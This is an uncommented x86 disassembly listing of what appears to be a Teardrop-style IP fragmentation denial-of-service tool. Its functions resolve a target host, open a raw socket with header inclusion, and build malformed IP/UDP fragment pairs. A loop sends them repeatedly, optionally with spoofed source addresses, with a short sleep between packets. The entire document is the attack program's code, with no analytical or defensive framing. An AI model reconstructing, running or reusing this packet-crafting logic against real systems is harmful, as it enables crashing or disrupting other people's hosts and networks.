push   ebp
mov    ebp,esp
push   ebx
call   804860d <_init+0x9>
pop    ebx
add    ebx,0x1a6f
cmp    DWORD PTR [ebx+0x6c],0x0
je     8048622 <_init+0x1e>
call   0 <_init-0x8048604>
mov    esi,esi
call   8048850 <frame_dummy>
call   8048e60 <__do_global_ctors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   DWORD PTR ds:0x804a080
jmp    DWORD PTR ds:0x804a084
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x804a088
push   0x0
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a08c
push   0x8
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a090
push   0x10
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a094
push   0x18
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a098
push   0x20
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a09c
push   0x28
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0a0
push   0x30
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0a4
push   0x38
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0a8
push   0x40
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0ac
push   0x48
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0b0
push   0x50
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0b4
push   0x58
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0b8
push   0x60
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0bc
push   0x68
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0c0
push   0x70
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0c4
push   0x78
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0c8
push   0x80
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0cc
push   0x88
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0d0
push   0x90
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0d4
push   0x98
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0d8
push   0xa0
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0dc
push   0xa8
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0e0
push   0xb0
jmp    8048634 <.plt>
jmp    DWORD PTR ds:0x804a0e4
push   0xb8
jmp    8048634 <.plt>
xor    ebp,ebp
pop    esi
mov    ecx,esp
and    esp,0xfffffff8
push   eax
push   esp
push   edx
push   0x8048e8c
push   0x8048604
push   ecx
push   esi
push   0x8048b24
call   8048714 <__libc_start_main@plt>
hlt    
nop
nop
............
push   ebp
mov    ebp,esp
cmp    DWORD PTR ds:0x804a064,0x0
jne    8048844 <__do_global_dtors_aux+0x44>
jmp    804881d <__do_global_dtors_aux+0x1d>
mov    esi,esi
lea    edx,[eax+0x4]
mov    DWORD PTR ds:0x804a060,edx
mov    eax,DWORD PTR [eax]
call   eax
mov    eax,ds:0x804a060
cmp    DWORD PTR [eax],0x0
jne    8048810 <__do_global_dtors_aux+0x10>
mov    eax,0x80486c4
test   eax,eax
je     804883a <__do_global_dtors_aux+0x3a>
push   0x804a068
call   80486c4 <__deregister_frame_info@plt>
mov    DWORD PTR ds:0x804a064,0x1
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
mov    eax,0x8048654
test   eax,eax
je     804886b <frame_dummy+0x1b>
push   0x804a194
push   0x804a068
call   8048654 <__register_frame_info@plt>
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
leave  
ret    
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
mov    eax,DWORD PTR [ebp+0x8]
push   eax
push   0x8048ee0
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0xc
push   0x0
call   8048754 <exit@plt>
add    esp,0x4
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x8
mov    eax,DWORD PTR [ebp+0x8]
push   eax
call   8048704 <inet_addr@plt>
add    esp,0x4
mov    eax,eax
mov    edx,eax
mov    DWORD PTR [ebp-0x4],edx
cmp    edx,0xffffffff
jne    80488fd <name_resolve+0x55>
mov    eax,DWORD PTR [ebp+0x8]
push   eax
call   8048734 <gethostbyname@plt>
add    esp,0x4
mov    eax,eax
mov    DWORD PTR [ebp-0x8],eax
cmp    DWORD PTR [ebp-0x8],0x0
jne    80488e1 <name_resolve+0x39>
xor    eax,eax
jmp    8048904 <name_resolve+0x5c>
mov    eax,DWORD PTR [ebp-0x8]
mov    edx,DWORD PTR [eax+0xc]
push   edx
lea    eax,[ebp-0x4]
push   eax
mov    eax,DWORD PTR [ebp-0x8]
mov    edx,DWORD PTR [eax+0x10]
mov    eax,DWORD PTR [edx]
push   eax
call   8048684 <bcopy@plt>
add    esp,0xc
mov    edx,DWORD PTR [ebp-0x4]
mov    eax,edx
jmp    8048904 <name_resolve+0x5c>
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x20
push   ebx
mov    eax,DWORD PTR [ebp+0x14]
mov    edx,DWORD PTR [ebp+0x18]
mov    WORD PTR [ebp-0x2],ax
mov    WORD PTR [ebp-0x4],dx
mov    DWORD PTR [ebp-0x8],0x0
mov    DWORD PTR [ebp-0xc],0x0
mov    WORD PTR [ebp-0x20],0x2
mov    ax,WORD PTR [ebp-0x2]
mov    WORD PTR [ebp-0x1e],ax
mov    eax,DWORD PTR [ebp+0x10]
mov    DWORD PTR [ebp-0x1c],eax
push   0x38
call   80486a4 <malloc@plt>
add    esp,0x4
mov    eax,eax
mov    DWORD PTR [ebp-0x8],eax
mov    eax,DWORD PTR [ebp-0x8]
mov    DWORD PTR [ebp-0xc],eax
push   0x38
mov    eax,DWORD PTR [ebp-0xc]
push   eax
call   8048744 <bzero@plt>
add    esp,0x8
mov    BYTE PTR [ebp-0xd],0x45
push   0x1
lea    eax,[ebp-0xd]
push   eax
mov    eax,DWORD PTR [ebp-0xc]
push   eax
call   8048724 <memcpy@plt>
add    esp,0xc
add    DWORD PTR [ebp-0xc],0x2
push   0x38
call   8048784 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    WORD PTR [edx],ax
add    DWORD PTR [ebp-0xc],0x2
push   0xf2
call   8048784 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    WORD PTR [edx],ax
add    DWORD PTR [ebp-0xc],0x2
push   0x2000
call   8048784 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    ecx,DWORD PTR [ebp-0xc]
mov    bx,WORD PTR [ecx]
or     ebx,eax
mov    WORD PTR [edx],bx
add    DWORD PTR [ebp-0xc],0x2
mov    eax,DWORD PTR [ebp-0xc]
mov    WORD PTR [eax],0x40
mov    BYTE PTR [ebp-0xd],0x11
push   0x1
lea    eax,[ebp-0xd]
push   eax
mov    eax,DWORD PTR [ebp-0xc]
inc    eax
push   eax
call   8048724 <memcpy@plt>
add    esp,0xc
add    DWORD PTR [ebp-0xc],0x4
mov    eax,DWORD PTR [ebp-0xc]
mov    edx,DWORD PTR [ebp+0xc]
mov    DWORD PTR [eax],edx
add    DWORD PTR [ebp-0xc],0x4
mov    eax,DWORD PTR [ebp-0xc]
mov    edx,DWORD PTR [ebp+0x10]
mov    DWORD PTR [eax],edx
add    DWORD PTR [ebp-0xc],0x4
movzx  eax,WORD PTR [ebp-0x2]
push   eax
call   8048784 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    WORD PTR [edx],ax
add    DWORD PTR [ebp-0xc],0x2
movzx  eax,WORD PTR [ebp-0x4]
push   eax
call   8048784 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    WORD PTR [edx],ax
add    DWORD PTR [ebp-0xc],0x2
push   0x24
call   8048784 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    WORD PTR [edx],ax
push   0x10
lea    edx,[ebp-0x20]
mov    eax,edx
push   eax
push   0x0
push   0x38
mov    eax,DWORD PTR [ebp-0x8]
push   eax
mov    eax,DWORD PTR [ebp+0x8]
push   eax
call   80486b4 <sendto@plt>
add    esp,0x18
mov    eax,eax
cmp    eax,0xffffffff
jne    8048a91 <send_frags+0x189>
push   0x8048f2f
call   8048664 <perror@plt>
add    esp,0x4
mov    eax,DWORD PTR [ebp-0x8]
push   eax
call   8048774 <free@plt>
add    esp,0x4
push   0x1
call   8048754 <exit@plt>
add    esp,0x4
mov    ebx,DWORD PTR [ebp-0x8]
add    ebx,0x2
mov    DWORD PTR [ebp-0xc],ebx
push   0x18
call   8048784 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    WORD PTR [edx],ax
add    DWORD PTR [ebp-0xc],0x4
push   0xffff
call   8048784 <htons@plt>
add    esp,0x4
mov    eax,eax
mov    edx,DWORD PTR [ebp-0xc]
mov    WORD PTR [edx],ax
push   0x10
lea    edx,[ebp-0x20]
mov    eax,edx
push   eax
push   0x0
push   0x18
mov    eax,DWORD PTR [ebp-0x8]
push   eax
mov    eax,DWORD PTR [ebp+0x8]
push   eax
call   80486b4 <sendto@plt>
add    esp,0x18
mov    eax,eax
cmp    eax,0xffffffff
jne    8048b10 <send_frags+0x208>
push   0x8048f2f
call   8048664 <perror@plt>
add    esp,0x4
mov    eax,DWORD PTR [ebp-0x8]
push   eax
call   8048774 <free@plt>
add    esp,0x4
push   0x1
call   8048754 <exit@plt>
add    esp,0x4
nop
lea    esi,[esi+eiz*1+0x0]
mov    eax,DWORD PTR [ebp-0x8]
push   eax
call   8048774 <free@plt>
add    esp,0x4
mov    ebx,DWORD PTR [ebp-0x24]
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x24
mov    DWORD PTR [ebp-0x4],0x1
mov    DWORD PTR [ebp-0x8],0x0
mov    DWORD PTR [ebp-0x14],0x1f4
mov    DWORD PTR [ebp-0x18],0x0
mov    DWORD PTR [ebp-0x1c],0x0
mov    WORD PTR [ebp-0x1e],0x0
mov    WORD PTR [ebp-0x20],0x0
push   0x8048f40
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0x8
push   0xff
push   0x3
push   0x2
call   80487a4 <socket@plt>
add    esp,0xc
mov    eax,eax
mov    DWORD PTR [ebp-0x10],eax
cmp    DWORD PTR [ebp-0x10],0x0
jge    8048ba0 <main+0x7c>
push   0x8048f7b
call   8048664 <perror@plt>
add    esp,0x4
push   0x1
call   8048754 <exit@plt>
add    esp,0x4
nop
push   0x4
lea    eax,[ebp-0x4]
push   eax
push   0x3
push   0x0
mov    eax,DWORD PTR [ebp-0x10]
push   eax
call   80486d4 <setsockopt@plt>
add    esp,0x14
mov    eax,eax
test   eax,eax
jge    8048bd3 <main+0xaf>
push   0x8048f86
call   8048664 <perror@plt>
add    esp,0x4
push   0x1
call   8048754 <exit@plt>
add    esp,0x4
cmp    DWORD PTR [ebp+0x8],0x1
jg     8048be7 <main+0xc3>
mov    eax,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [eax]
push   edx
call   8048880 <usage>
add    esp,0x4
mov    eax,DWORD PTR [ebp+0xc]
add    eax,0x4
mov    edx,DWORD PTR [eax]
push   edx
call   80488a8 <name_resolve>
add    esp,0x4
mov    eax,eax
mov    DWORD PTR [ebp-0x1c],eax
cmp    DWORD PTR [ebp-0x1c],0x0
jne    8048c20 <main+0xfc>
push   0x8048fa0
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0x8
push   0x1
call   8048754 <exit@plt>
add    esp,0x4
nop
push   0x8048fc4
mov    eax,DWORD PTR [ebp+0xc]
push   eax
mov    eax,DWORD PTR [ebp+0x8]
push   eax
call   80486f4 <getopt@plt>
add    esp,0xc
mov    eax,eax
mov    DWORD PTR [ebp-0xc],eax
cmp    DWORD PTR [ebp-0xc],0xffffffff
jne    8048c46 <main+0x122>
jmp    8048cd6 <main+0x1b2>
mov    eax,DWORD PTR [ebp-0xc]
cmp    eax,0x73
je     8048c80 <main+0x15c>
cmp    eax,0x73
jg     8048c60 <main+0x13c>
cmp    eax,0x6e
je     8048c67 <main+0x143>
jmp    8048cc1 <main+0x19d>
lea    esi,[esi+0x0]
cmp    eax,0x78
je     8048cb8 <main+0x194>
jmp    8048cc1 <main+0x19d>
mov    eax,ds:0x804a190
push   eax
call   8048764 <atoi@plt>
add    esp,0x4
mov    eax,eax
mov    DWORD PTR [ebp-0x8],eax
jmp    8048cd1 <main+0x1ad>
lea    esi,[esi+eiz*1+0x0]
mov    eax,ds:0x804a190
push   eax
call   80488a8 <name_resolve>
add    esp,0x4
mov    eax,eax
mov    DWORD PTR [ebp-0x18],eax
cmp    DWORD PTR [ebp-0x18],0x0
jne    8048cb6 <main+0x192>
push   0x8048fe0
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0x8
push   0x1
call   8048754 <exit@plt>
add    esp,0x4
jmp    8048cd1 <main+0x1ad>
mov    DWORD PTR [ebp-0x14],0x0
jmp    8048cd1 <main+0x1ad>
mov    eax,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [eax]
push   edx
call   8048880 <usage>
add    esp,0x4
jmp    8048cd1 <main+0x1ad>
jmp    8048c21 <main+0xfd>
push   0x0
call   80486e4 <time@plt>
add    esp,0x4
mov    eax,eax
push   eax
call   8048794 <srandom@plt>
add    esp,0x4
cmp    DWORD PTR [ebp-0x8],0x0
jne    8048cf8 <main+0x1d4>
mov    DWORD PTR [ebp-0x8],0xbeef
push   0x8049000
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0x8
cmp    DWORD PTR [ebp-0x18],0x0
jne    8048d26 <main+0x202>
push   0x8049022
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0x8
jmp    8048d4e <main+0x22a>
mov    eax,DWORD PTR [ebp-0x18]
mov    DWORD PTR [ebp-0x24],eax
mov    eax,DWORD PTR [ebp-0x24]
push   eax
call   8048694 <inet_ntoa@plt>
add    esp,0x4
mov    eax,eax
push   eax
push   0x8049032
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0xc
mov    eax,DWORD PTR [ebp-0x1c]
mov    DWORD PTR [ebp-0x24],eax
mov    eax,DWORD PTR [ebp-0x24]
push   eax
call   8048694 <inet_ntoa@plt>
add    esp,0x4
mov    eax,eax
push   eax
push   0x8049037
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0xc
mov    eax,DWORD PTR [ebp-0x8]
push   eax
push   0x8049044
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0xc
push   0x804904f
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0x8
mov    DWORD PTR [ebp-0xc],0x0
mov    eax,DWORD PTR [ebp-0xc]
cmp    eax,DWORD PTR [ebp-0x8]
jl     8048db4 <main+0x290>
jmp    8048e41 <main+0x31d>
cmp    DWORD PTR [ebp-0x18],0x0
jne    8048df0 <main+0x2cc>
call   80487b4 <rand@plt>
mov    eax,eax
movzx  edx,ax
push   edx
call   80487b4 <rand@plt>
mov    eax,eax
movzx  edx,ax
push   edx
mov    eax,DWORD PTR [ebp-0x1c]
push   eax
call   80487b4 <rand@plt>
mov    eax,eax
push   eax
mov    eax,DWORD PTR [ebp-0x10]
push   eax
call   8048908 <send_frags>
add    esp,0x14
jmp    8048e1a <main+0x2f6>
lea    esi,[esi+0x0]
call   80487b4 <rand@plt>
mov    eax,eax
movzx  edx,ax
push   edx
call   80487b4 <rand@plt>
mov    eax,eax
movzx  edx,ax
push   edx
mov    eax,DWORD PTR [ebp-0x1c]
push   eax
mov    eax,DWORD PTR [ebp-0x18]
push   eax
mov    eax,DWORD PTR [ebp-0x10]
push   eax
call   8048908 <send_frags>
add    esp,0x14
push   0x8049052
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0x8
mov    eax,DWORD PTR [ebp-0x14]
push   eax
call   8048644 <usleep@plt>
add    esp,0x4
inc    DWORD PTR [ebp-0xc]
jmp    8048da7 <main+0x283>
push   0x8049058
mov    eax,ds:0x804a18c
push   eax
call   8048674 <fprintf@plt>
add    esp,0x8
xor    eax,eax
jmp    8048e58 <main+0x334>
leave  
ret    
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,0x804a06c
cmp    DWORD PTR ds:0x804a06c,0xffffffff
je     8048e7e <__do_global_ctors_aux+0x1e>
mov    eax,DWORD PTR [ebx]
call   eax
add    ebx,0xfffffffc
cmp    DWORD PTR [ebx],0xffffffff
jne    8048e72 <__do_global_ctors_aux+0x12>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
nop
push   ebp
mov    ebp,esp
leave  
ret    
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
call   8048e95 <_fini+0x9>
pop    ebx
add    ebx,0x11e7
call   8048800 <__do_global_dtors_aux>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
